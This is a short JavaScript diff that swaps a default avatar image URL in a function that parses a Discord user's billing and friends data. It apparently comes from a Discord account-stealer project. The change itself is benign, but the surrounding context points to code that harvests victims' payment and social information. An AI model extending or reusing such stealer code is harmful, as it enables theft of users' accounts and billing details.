@@ -279,7 +279,7 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
+        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1081681894816620614/1081682054099505212/AZ.jpg"
 
 
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
